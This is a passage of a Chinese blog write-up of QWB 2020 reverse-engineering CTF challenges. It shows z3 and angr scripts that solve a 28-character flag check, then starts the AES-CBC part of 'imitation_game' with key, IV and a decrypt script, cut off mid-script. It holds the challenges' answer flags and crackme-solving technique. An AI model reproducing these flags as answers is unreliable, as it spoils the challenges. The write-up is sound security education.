class="number">1</span>]*-<span class="number">280754</span> + flag[<span class="number">3</span>]*<span class="number">96631</span> + flag[<span class="number">6</span>]*<span class="number">229049</span> + flag[<span class="number">2</span>]*-<span class="number">269632</span> + flag[<span class="number">9</span>]*-<span class="number">39259</span> + flag[<span class="number">4</span>]*<span class="number">171321</span> + flag[<span class="number">5</span>]*-<span class="number">142792</span> + flag[<span class="number">7</span>]*-<span class="number">64473</span> + flag[<span class="number">8</span>]*-<span class="number">196269</span> + flag[<span class="number">0</span>]*-<span class="number">168397</span> ) == -<span class="number">70797046</span>)</span><br><span class="line">solver.add( (flag[<span class="number">6</span>]*<span class="number">121516</span> + flag[<span class="number">5</span>]*-<span class="number">93524</span> + flag[<span class="number">0</span>]*<span class="number">292706</span> + flag[<span class="number">3</span>]*<span class="number">182157</span> + flag[<span class="number">10</span>]*<span class="number">195039</span> + flag[<span class="number">2</span>]*-<span class="number">25900</span> + flag[<span class="number">9</span>]*-<span class="number">32946</span> + flag[<span class="number">1</span>]*-<span class="number">256202</span> + flag[<span class="number">8</span>]*<span class="number">162669</span> + flag[<span class="number">4</span>]*-<span class="number">235026</span> + flag[<span class="number">7</span>]*<span class="number">165207</span> ) == <span class="number">28263339</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">50166</span> + flag[<span class="number">11</span>]*-<span class="number">165434</span> + flag[<span class="number">2</span>]*<span class="number">80519</span> + flag[<span class="number">3</span>]*<span class="number">272791</span> + flag[<span class="number">10</span>]*-<span class="number">4940</span> + flag[<span class="number">5</span>]*-<span class="number">272650</span> + flag[<span class="number">1</span>]*<span class="number">133728</span> + flag[<span class="number">7</span>]*-<span class="number">258188</span> + flag[<span class="number">8</span>]*-<span class="number">111160</span> + flag[<span class="number">9</span>]*-<span class="number">92964</span> + flag[<span class="number">6</span>]*-<span class="number">131770</span> + flag[<span class="number">4</span>]*<span class="number">148713</span> ) == -<span class="number">22025185</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*-<span class="number">93199</span> + flag[<span class="number">3</span>]*<span class="number">162962</span> + flag[<span class="number">2</span>]*-<span class="number">214348</span> + flag[<span class="number">0</span>]*<span class="number">20489</span> + flag[<span class="number">8</span>]*-<span class="number">138253</span> + flag[<span class="number">9</span>]*<span class="number">141532</span> + flag[<span class="number">11</span>]*<span class="number">62018</span> + flag[<span class="number">6</span>]*-<span class="number">100280</span> + flag[<span class="number">1</span>]*-<span class="number">184125</span> + flag[<span class="number">12</span>]*<span class="number">71182</span> + flag[<span class="number">10</span>]*<span class="number">9710</span> + flag[<span class="number">4</span>]*-<span class="number">262820</span> + flag[<span class="number">5</span>]*<span class="number">147171</span> ) == -<span class="number">31396844</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">75412</span> + flag[<span class="number">13</span>]*-<span class="number">224754</span> + flag[<span class="number">2</span>]*-<span class="number">119275</span> + flag[<span class="number">9</span>]*-<span class="number">61880</span> + flag[<span class="number">4</span>]*<span class="number">22859</span> + flag[<span class="number">7</span>]*<span class="number">116256</span> + flag[<span class="number">3</span>]*<span class="number">122945</span> + flag[<span class="number">6</span>]*<span class="number">25739</span> + flag[<span class="number">1</span>]*-<span class="number">51437</span> + flag[<span class="number">5</span>]*-<span class="number">200702</span> + flag[<span class="number">10</span>]*-<span class="number">86956</span> + flag[<span class="number">12</span>]*<span class="number">220404</span> + flag[<span class="number">8</span>]*-<span class="number">55254</span> + flag[<span class="number">11</span>]*<span class="number">59999</span> ) == -<span class="number">37063008</span>)</span><br><span class="line">solver.add( (flag[<span class="number">8</span>]*<span class="number">300012</span> + flag[<span class="number">12</span>]*-<span class="number">249960</span> + flag[<span class="number">14</span>]*<span class="number">233663</span> + flag[<span class="number">10</span>]*-<span class="number">228149</span> + flag[<span class="number">11</span>]*-<span class="number">88326</span> + flag[<span class="number">1</span>]*<span class="number">144834</span> + flag[<span class="number">6</span>]*<span class="number">67553</span> + flag[<span class="number">2</span>]*-<span class="number">2621</span> + flag[<span class="number">4</span>]*<span class="number">135809</span> + flag[<span class="number">9</span>]*<span class="number">157462</span> + flag[<span class="number">5</span>]*<span class="number">278745</span> + flag[<span class="number">13</span>]*-<span class="number">189890</span> + flag[<span class="number">3</span>]*<span class="number">198502</span> + flag[<span class="number">0</span>]*<span class="number">111310</span> + flag[<span class="number">7</span>]*<span class="number">91783</span> ) == <span class="number">93457153</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*<span class="number">114175</span> + flag[<span class="number">1</span>]*-<span class="number">129997</span> + flag[<span class="number">10</span>]*<span class="number">54553</span> + flag[<span class="number">9</span>]*-<span class="number">163572</span> + flag[<span class="number">14</span>]*-<span class="number">48167</span> + flag[<span class="number">6</span>]*<span class="number">148005</span> + flag[<span class="number">11</span>]*<span class="number">230636</span> + flag[<span class="number">4</span>]*-<span class="number">235783</span> + flag[<span class="number">8</span>]*-<span class="number">233813</span> + flag[<span class="number">5</span>]*-<span class="number">181764</span> + flag[<span class="number">12</span>]*<span class="number">104421</span> + flag[<span class="number">2</span>]*<span class="number">125666</span> + flag[<span class="number">3</span>]*<span class="number">194067</span> + flag[<span class="number">13</span>]*-<span class="number">11943</span> + flag[<span class="number">0</span>]*<span class="number">15897</span> + flag[<span class="number">15</span>]*-<span class="number">251681</span> ) == -<span class="number">36640750</span>)</span><br><span class="line">solver.add( (flag[<span class="number">16</span>]*<span class="number">277429</span> + flag[<span class="number">1</span>]*-<span class="number">39495</span> + flag[<span class="number">2</span>]*<span class="number">254969</span> + flag[<span class="number">11</span>]*<span class="number">154844</span> + flag[<span class="number">4</span>]*-<span class="number">1254</span> + flag[<span class="number">5</span>]*-<span class="number">52501</span> + flag[<span class="number">7</span>]*-<span class="number">289940</span> + flag[<span class="number">6</span>]*<span class="number">70051</span> + flag[<span class="number">12</span>]*<span class="number">74128</span> + flag[<span class="number">9</span>]*<span class="number">22454</span> + flag[<span class="number">8</span>]*-<span class="number">68478</span> + flag[<span class="number">13</span>]*<span class="number">272318</span> + flag[<span class="number">15</span>]*-<span class="number">203538</span> + flag[<span class="number">10</span>]*<span class="number">34835</span> + flag[<span class="number">14</span>]*-<span class="number">228520</span> + flag[<span class="number">3</span>]*-<span class="number">90549</span> + flag[<span class="number">0</span>]*-<span class="number">132752</span> ) == -<span class="number">6628237</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*-<span class="number">210718</span> + flag[<span class="number">16</span>]*-<span class="number">36680</span> + flag[<span class="number">4</span>]*-<span class="number">112241</span> + flag[<span class="number">14</span>]*<span class="number">10792</span> + flag[<span class="number">15</span>]*<span class="number">55085</span> + flag[<span class="number">1</span>]*-<span class="number">5107</span> + flag[<span class="number">8</span>]*-<span class="number">247882</span> + flag[<span class="number">10</span>]*-<span class="number">94616</span> + flag[<span class="number">12</span>]*-<span class="number">86968</span> + flag[<span class="number">9</span>]*-<span class="number">53271</span> + flag[<span class="number">0</span>]*<span class="number">237987</span> + flag[<span class="number">5</span>]*<span class="number">66107</span> + flag[<span class="number">2</span>]*<span class="number">189050</span> + flag[<span class="number">13</span>]*-<span class="number">148216</span> + flag[<span class="number">3</span>]*-<span class="number">144172</span> + flag[<span class="number">17</span>]*-<span class="number">5873</span> + flag[<span class="number">11</span>]*<span class="number">128092</span> + flag[<span class="number">6</span>]*-<span class="number">249539</span> ) == -<span class="number">53084017</span>)</span><br><span class="line">solver.add( (flag[<span class="number">10</span>]*<span class="number">12264</span> + flag[<span class="number">6</span>]*-<span class="number">280672</span> + flag[<span class="number">0</span>]*<span class="number">134548</span> + flag[<span class="number">11</span>]*<span class="number">175077</span> + flag[<span class="number">4</span>]*-<span class="number">74209</span> + flag[<span class="number">12</span>]*<span class="number">156976</span> + flag[<span class="number">17</span>]*<span class="number">1337</span> + flag[<span class="number">7</span>]*<span class="number">84628</span> + flag[<span class="number">18</span>]*-<span class="number">238861</span> + flag[<span class="number">3</span>]*<span class="number">100397</span> + flag[<span class="number">8</span>]*-<span class="number">155443</span> + flag[<span class="number">15</span>]*<span class="number">272227</span> + flag[<span class="number">16</span>]*<span class="number">58825</span> + flag[<span class="number">14</span>]*<span class="number">145470</span> + flag[<span class="number">1</span>]*<span class="number">195447</span> + flag[<span class="number">5</span>]*-<span class="number">65515</span> + flag[<span class="number">13</span>]*<span class="number">19517</span> + flag[<span class="number">2</span>]*-<span class="number">186088</span> + flag[<span class="number">9</span>]*<span class="number">56937</span> ) == <span class="number">60764977</span>)</span><br><span class="line">solver.add( (flag[<span class="number">2</span>]*<span class="number">139185</span> + flag[<span class="number">1</span>]*-<span class="number">138274</span> + flag[<span class="number">10</span>]*-<span class="number">18520</span> + flag[<span class="number">12</span>]*<span class="number">245858</span> + flag[<span class="number">18</span>]*-<span class="number">36580</span> + flag[<span class="number">15</span>]*<span class="number">162065</span> + flag[<span class="number">4</span>]*-<span class="number">122090</span> + flag[<span class="number">19</span>]*-<span class="number">104395</span> + flag[<span class="number">14</span>]*<span class="number">137214</span> + flag[<span class="number">11</span>]*<span class="number">281718</span> + flag[<span class="number">6</span>]*-<span class="number">170051</span> + flag[<span class="number">17</span>]*<span class="number">137206</span> + flag[<span class="number">3</span>]*<span class="number">176103</span> + flag[<span class="number">8</span>]*-<span class="number">190345</span> + flag[<span class="number">16</span>]*<span class="number">54404</span> + flag[<span class="number">0</span>]*-<span class="number">199631</span> + flag[<span class="number">13</span>]*<span class="number">159144</span> + flag[<span class="number">9</span>]*-<span class="number">283834</span> + flag[<span class="number">7</span>]*-<span class="number">58873</span> + flag[<span class="number">5</span>]*-<span class="number">197535</span> ) == <span class="number">4912728</span>)</span><br><span class="line">solver.add( (flag[<span class="number">12</span>]*-<span class="number">193384</span> + flag[<span class="number">5</span>]*<span class="number">270604</span> + flag[<span class="number">10</span>]*-<span class="number">109205</span> + flag[<span class="number">3</span>]*-<span class="number">39775</span> + flag[<span class="number">4</span>]*-<span class="number">97284</span> + flag[<span class="number">14</span>]*-<span class="number">199427</span> + flag[<span class="number">18</span>]*<span class="number">38137</span> + flag[<span class="number">2</span>]*<span class="number">148338</span> + flag[<span class="number">0</span>]*<span class="number">108149</span> + flag[<span class="number">17</span>]*-<span class="number">28337</span> + flag[<span class="number">1</span>]*-<span class="number">239133</span> + flag[<span class="number">6</span>]*<span class="number">27751</span> + flag[<span class="number">16</span>]*<span class="number">181147</span> + flag[<span class="number">19</span>]*<span class="number">127913</span> + flag[<span class="number">15</span>]*<span class="number">150036</span> + flag[<span class="number">20</span>]*-<span class="number">162393</span> + flag[<span class="number">11</span>]*-<span class="number">72984</span> + flag[<span class="number">8</span>]*<span class="number">74470</span> + flag[<span class="number">13</span>]*<span class="number">63329</span> + flag[<span class="number">9</span>]*<span class="number">293345</span> + flag[<span class="number">7</span>]*<span class="number">168963</span> ) == <span class="number">45577809</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">38942</span> + flag[<span class="number">13</span>]*-<span class="number">273571</span> + flag[<span class="number">20</span>]*<span class="number">60492</span> + flag[<span class="number">9</span>]*-<span class="number">98937</span> + flag[<span class="number">5</span>]*<span class="number">293201</span> + flag[<span class="number">11</span>]*<span class="number">109605</span> + flag[<span class="number">3</span>]*<span class="number">131692</span> + flag[<span class="number">1</span>]*<span class="number">44675</span> + flag[<span class="number">10</span>]*<span class="number">263208</span> + flag[<span class="number">12</span>]*<span class="number">293781</span> + flag[<span class="number">7</span>]*<span class="number">64641</span> + flag[<span class="number">21</span>]*-<span class="number">207716</span> + flag[<span class="number">15</span>]*<span class="number">153071</span> + flag[<span class="number">4</span>]*<span class="number">179514</span> + flag[<span class="number">14</span>]*-<span class="number">174651</span> + flag[<span class="number">2</span>]*<span class="number">246135</span> + flag[<span class="number">16</span>]*-<span class="number">220539</span> + flag[<span class="number">8</span>]*-<span class="number">188979</span> + flag[<span class="number">19</span>]*<span class="number">244009</span> + flag[<span class="number">17</span>]*<span class="number">111858</span> + flag[<span class="number">6</span>]*<span class="number">45637</span> + flag[<span class="number">18</span>]*-<span class="number">285946</span> ) == <span class="number">77539017</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*-<span class="number">71444</span> + flag[<span class="number">7</span>]*-<span class="number">130852</span> + flag[<span class="number">2</span>]*<span class="number">255675</span> + flag[<span class="number">16</span>]*<span class="number">59119</span> + flag[<span class="number">8</span>]*-<span class="number">258754</span> + flag[<span class="number">12</span>]*<span class="number">9791</span> + flag[<span class="number">3</span>]*<span class="number">76213</span> + flag[<span class="number">14</span>]*<span class="number">105293</span> + flag[<span class="number">21</span>]*-<span class="number">148390</span> + flag[<span class="number">1</span>]*-<span class="number">194890</span> + flag[<span class="number">10</span>]*-<span class="number">141434</span> + flag[<span class="number">6</span>]*-<span class="number">43684</span> + flag[<span class="number">17</span>]*-<span class="number">21957</span> + flag[<span class="number">13</span>]*-<span class="number">197632</span> + flag[<span class="number">0</span>]*-<span class="number">58530</span> + flag[<span class="number">15</span>]*<span class="number">295735</span> + flag[<span class="number">22</span>]*<span class="number">92896</span> + flag[<span class="number">20</span>]*-<span class="number">86224</span> + flag[<span class="number">11</span>]*-<span class="number">206184</span> + flag[<span class="number">4</span>]*<span class="number">32897</span> + flag[<span class="number">18</span>]*<span class="number">234971</span> + flag[<span class="number">9</span>]*-<span class="number">160726</span> + flag[<span class="number">19</span>]*<span class="number">127285</span> ) == -<span class="number">38197685</span>)</span><br><span class="line">solver.add( (flag[<span class="number">9</span>]*-<span class="number">291063</span> + flag[<span class="number">18</span>]*<span class="number">191404</span> + flag[<span class="number">2</span>]*-<span class="number">60213</span> + flag[<span class="number">8</span>]*-<span class="number">133696</span> + flag[<span class="number">22</span>]*<span class="number">89330</span> + flag[<span class="number">0</span>]*<span class="number">196370</span> + flag[<span class="number">12</span>]*-<span class="number">44618</span> + flag[<span class="number">16</span>]*<span class="number">175825</span> + flag[<span class="number">11</span>]*<span class="number">281705</span> + flag[<span class="number">21</span>]*-<span class="number">238839</span> + flag[<span class="number">15</span>]*-<span class="number">188959</span> + flag[<span class="number">19</span>]*-<span class="number">180522</span> + flag[<span class="number">5</span>]*-<span class="number">211930</span> + flag[<span class="number">7</span>]*<span class="number">103466</span> + flag[<span class="number">6</span>]*-<span class="number">40848</span> + flag[<span class="number">23</span>]*<span class="number">191822</span> + flag[<span class="number">3</span>]*<span class="number">268813</span> + flag[<span class="number">17</span>]*-<span class="number">236806</span> + flag[<span class="number">14</span>]*<span class="number">202621</span> + flag[<span class="number">10</span>]*<span class="number">120347</span> + flag[<span class="number">4</span>]*<span class="number">144870</span> + flag[<span class="number">1</span>]*<span class="number">197685</span> + flag[<span class="number">20</span>]*<span class="number">205675</span> + flag[<span class="number">13</span>]*<span class="number">13902</span> ) == <span class="number">67763764</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">85246</span> + flag[<span class="number">6</span>]*<span class="number">91076</span> + flag[<span class="number">17</span>]*<span class="number">37665</span> + flag[<span class="number">19</span>]*-<span class="number">243227</span> + flag[<span class="number">2</span>]*<span class="number">14439</span> + flag[<span class="number">12</span>]*-<span class="number">8509</span> + flag[<span class="number">11</span>]*<span class="number">9601</span> + flag[<span class="number">24</span>]*-<span class="number">94067</span> + flag[<span class="number">23</span>]*-<span class="number">199130</span> + flag[<span class="number">13</span>]*-<span class="number">161113</span> + flag[<span class="number">18</span>]*-<span class="number">210563</span> + flag[<span class="number">20</span>]*-<span class="number">268221</span> + flag[<span class="number">5</span>]*-<span class="number">54321</span> + flag[<span class="number">7</span>]*<span class="number">234832</span> + flag[<span class="number">9</span>]*<span class="number">115189</span> + flag[<span class="number">14</span>]*-<span class="number">173902</span> + flag[<span class="number">16</span>]*<span class="number">7838</span> + flag[<span class="number">22</span>]*<span class="number">115716</span> + flag[<span class="number">3</span>]*-<span class="number">261617</span> + flag[<span class="number">1</span>]*-<span class="number">78459</span> + flag[<span class="number">8</span>]*<span class="number">29334</span> + flag[<span class="number">10</span>]*<span class="number">62004</span> + flag[<span class="number">21</span>]*-<span class="number">19740</span> + flag[<span class="number">15</span>]*<span class="number">69341</span> + flag[<span class="number">4</span>]*<span class="number">39558</span> ) == -<span class="number">98330271</span>)</span><br><span class="line">solver.add( (flag[<span class="number">15</span>]*<span class="number">226192</span> + flag[<span class="number">18</span>]*<span class="number">197710</span> + flag[<span class="number">10</span>]*-<span class="number">124307</span> + flag[<span class="number">14</span>]*-<span class="number">73366</span> + flag[<span class="number">7</span>]*<span class="number">92844</span> + flag[<span class="number">23</span>]*<span class="number">41768</span> + flag[<span class="number">13</span>]*<span class="number">10191</span> + flag[<span class="number">21</span>]*-<span class="number">271816</span> + flag[<span class="number">9</span>]*-<span class="number">35931</span> + flag[<span class="number">17</span>]*-<span class="number">242059</span> + flag[<span class="number">25</span>]*<span class="number">247654</span> + flag[<span class="number">6</span>]*<span class="number">263000</span> + flag[<span class="number">4</span>]*-<span class="number">65268</span> + flag[<span class="number">0</span>]*<span class="number">232645</span> + flag[<span class="number">12</span>]*-<span class="number">81477</span> + flag[<span class="number">5</span>]*<span class="number">180400</span> + flag[<span class="number">16</span>]*-<span class="number">212633</span> + flag[<span class="number">20</span>]*-<span class="number">78437</span> + flag[<span class="number">1</span>]*-<span class="number">111200</span> + flag[<span class="number">8</span>]*-<span class="number">260264</span> + flag[<span class="number">24</span>]*<span class="number">32044</span> + flag[<span class="number">3</span>]*-<span class="number">252915</span> + flag[<span class="number">22</span>]*<span class="number">169299</span> + flag[<span class="number">2</span>]*-<span class="number">75568</span> + flag[<span class="number">19</span>]*<span class="number">38468</span> + flag[<span class="number">11</span>]*<span class="number">3788</span> ) == -<span class="number">13464859</span>)</span><br><span class="line">solver.add( (flag[<span class="number">10</span>]*-<span class="number">155664</span> + flag[<span class="number">1</span>]*-<span class="number">206964</span> + flag[<span class="number">16</span>]*-<span class="number">166693</span> + flag[<span class="number">17</span>]*-<span class="number">293146</span> + flag[<span class="number">19</span>]*-<span class="number">213665</span> + flag[<span class="number">26</span>]*-<span class="number">253617</span> + flag[<span class="number">0</span>]*-<span class="number">121854</span> + flag[<span class="number">7</span>]*-<span class="number">84952</span> + flag[<span class="number">18</span>]*-<span class="number">153409</span> + flag[<span class="number">8</span>]*<span class="number">83918</span> + flag[<span class="number">20</span>]*-<span class="number">78913</span> + flag[<span class="number">13</span>]*<span class="number">271210</span> + flag[<span class="number">4</span>]*<span class="number">219151</span> + flag[<span class="number">3</span>]*<span class="number">186585</span> + flag[<span class="number">2</span>]*<span class="number">77915</span> + flag[<span class="number">6</span>]*<span class="number">231326</span> + flag[<span class="number">22</span>]*<span class="number">215574</span> + flag[<span class="number">25</span>]*-<span class="number">6866</span> + flag[<span class="number">5</span>]*<span class="number">77693</span> + flag[<span class="number">12</span>]*<span class="number">116581</span> + flag[<span class="number">21</span>]*-<span class="number">74795</span> + flag[<span class="number">14</span>]*-<span class="number">15606</span> + flag[<span class="number">23</span>]*-<span class="number">102361</span> + flag[<span class="number">15</span>]*-<span class="number">254282</span> + flag[<span class="number">24</span>]*-<span class="number">188087</span> + flag[<span class="number">9</span>]*-<span class="number">23897</span> + flag[<span class="number">11</span>]*<span class="number">180598</span> ) == -<span class="number">55504393</span>)</span><br><span class="line">solver.add( (flag[<span class="number">16</span>]*<span class="number">167885</span> + flag[<span class="number">1</span>]*<span class="number">258890</span> + flag[<span class="number">17</span>]*-<span class="number">109447</span> + flag[<span class="number">24</span>]*<span class="number">231264</span> + flag[<span class="number">15</span>]*<span class="number">98136</span> + flag[<span class="number">20</span>]*-<span class="number">113009</span> + flag[<span class="number">6</span>]*-<span class="number">106792</span> + flag[<span class="number">19</span>]*<span class="number">147747</span> + flag[<span class="number">22</span>]*<span class="number">138998</span> + flag[<span class="number">18</span>]*<span class="number">88628</span> + flag[<span class="number">26</span>]*<span class="number">6966</span> + flag[<span class="number">8</span>]*-<span class="number">14347</span> + flag[<span class="number">2</span>]*-<span class="number">136952</span> + flag[<span class="number">4</span>]*-<span class="number">225830</span> + flag[<span class="number">25</span>]*<span class="number">167370</span> + flag[<span class="number">3</span>]*-<span class="number">164339</span> + flag[<span class="number">5</span>]*<span class="number">77375</span> + flag[<span class="number">10</span>]*-<span class="number">120743</span> + flag[<span class="number">14</span>]*-<span class="number">143324</span> + flag[<span class="number">27</span>]*-<span class="number">38949</span> + flag[<span class="number">0</span>]*<span class="number">157781</span> + flag[<span class="number">21</span>]*<span class="number">40423</span> + flag[<span class="number">7</span>]*<span class="number">138308</span> + flag[<span class="number">23</span>]*-<span class="number">132906</span> + flag[<span class="number">9</span>]*<span class="number">278196</span> + flag[<span class="number">12</span>]*<span class="number">135302</span> + flag[<span class="number">11</span>]*<span class="number">264405</span> + flag[<span class="number">13</span>]*<span class="number">246315</span> ) == <span class="number">133068723</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = [ <span class="built_in">chr</span>( model[flag[i]].as_long() ) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>) ]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(result))</span><br><span class="line"><span class="comment">#flag&#123;g0_Fuck_xx_5egm3nt_0bf&#125;</span></span><br></pre></td></tr></table></figure>

<p>在网上搜到题解还有一种使用angr的方法，也记录一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">p = angr.Project(<span class="string">&quot;D:\\ahhh\\qwb\\mytest\\2020\\xx_warmup_obf\\xx_warmup_obf&quot;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x402D10</span>) <span class="comment">#入口</span></span><br><span class="line">tmp_addr = <span class="number">0x20000</span></span><br><span class="line">ans = claripy.BVS(<span class="string">&#x27;ans&#x27;</span>, <span class="number">8</span> * <span class="number">28</span>)</span><br><span class="line">state.memory.store(tmp_addr, ans)</span><br><span class="line">state.regs.rax = <span class="number">0x20000</span></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line"><span class="keyword">for</span> byt <span class="keyword">in</span> ans.chop(<span class="number">8</span>):</span><br><span class="line">    state.add_constraints(state.solver.And(byt &gt;= <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>),byt &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">find=[<span class="number">0x408470</span>] <span class="comment"># 目标(正常运行如果所有字符都判断正确就会调到这里)</span></span><br><span class="line">avoid=[<span class="number">0x402D2F</span>,<span class="number">0x402F96</span>,<span class="number">0x4032C5</span>,<span class="number">0x4034B6</span>,<span class="number">0x4035CF</span>,<span class="number">0x403728</span>,<span class="number">0x4039D4</span>,<span class="number">0x403B27</span>,<span class="number">0x403CB9</span>,<span class="number">0x403E34</span>,<span class="number">0x40418F</span>,<span class="number">0x40459C</span>,<span class="number">0x4048FE</span>, <span class="number">0x404C6D</span>,<span class="number">0x0405051</span>,<span class="number">0x0405286</span>,<span class="number">0x0405594</span> ,<span class="number">0x04057EF</span>,<span class="number">0x0405B96</span>,<span class="number">0x406057</span>,<span class="number">0x0406537</span>,<span class="number">0x0406931</span> ,<span class="number">0x0406DA9</span>,<span class="number">0x407069</span>,<span class="number">0x407606</span>,<span class="number">0x040790B</span>,<span class="number">0x0407D8F</span>,<span class="number">0x4081B4</span>,] <span class="comment">#限制</span></span><br><span class="line">sm.explore(find=find,avoid=avoid)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    solution_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    solution_bytes = solution_state.solver.<span class="built_in">eval</span>(ans,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">    solution = solution_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (solution)</span><br></pre></td></tr></table></figure>

<style>.qetanrecerji{}</style><img src="/2020/11/06/qwb2020-re/1763434247558-5.png" class="qetanrecerji" alt="img">

<p>用angr就少了提取28个方程参数的繁琐步骤，简单一些</p>
<p>flag{g0_Fuck_xx_5egm3nt_0bf}</p>
<h1 id="2020-re-imitation-game"><a href="#2020-re-imitation-game" class="headerlink" title="2020 re imitation_game"></a>2020 re imitation_game</h1><p>存在父进程调用子进程的逻辑，使用了fork函数</p>
<p>程序存在花指令，去除之后，反汇编main函数</p>
<style>.prtmwzzzddcz{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-6.png" class="prtmwzzzddcz" alt="img">

<style>.bruqfllgknkm{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-7.png" class="bruqfllgknkm" alt="img">

<p>flag分为两部分，同样验证方法也有两部分，首先第一部分是AES-CBC加密，这个程序动调我一直调不出来这个AES加密逻辑，实际上它是起了一个子进程用于运行这个加密和对比流程，将输入进去的数据进行AES加密之后与unk_562406204048处的值进行对比，对比后向父进程发送信号，如果成功则进入第二阶段，失败则直接返回”no”然后程序结束。</p>
<style>.ujomtwljsxpr{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-8.png" class="ujomtwljsxpr" alt="img">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9D7BA23CB1099A4841D16663D6AE3CABB825A9AE8B4AA6D17DC4B22AB35DE3D52B30509AD2881091771F0D86A2D3D6E16E24E94EF3F116050745EFD606454F3D    //加密后结果</span><br><span class="line">3E2C251318BEC36BA1372453031E51EC   //密钥</span><br><span class="line">202122232425262728292A2B2C2D2E2F   // IV</span><br></pre></td></tr></table></figure>

<style>.rnvijgwrkckc{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-9.png" class="rnvijgwrkckc" alt="img">

<p>用chefcrypt就可以解密，当然热可以写个脚本来解：</p>
<style>.akuaxejswywq{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-10.png" class="akuaxejswywq" alt="img">

<p>ASE-CBC加解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">       add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       add = <span class="number">0</span></span><br><span class="line">   text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">   <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">   key = <span class="string">b&quot;\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC&quot;</span></span><br><span class="line">   iv = <span class="string">b&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F&quot;</span></span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   text = add_to_16(text)</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   cipher_text = cryptos.encrypt(text)</span><br><span class="line">   <span class="keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line"></span><br><span class="line">   key = a2b_hex(<span class="string">b&quot;3E2C251318BEC36BA1372453031E51EC&quot;</span>)</span><br><span class="line">   iv = a2b_hex(<span 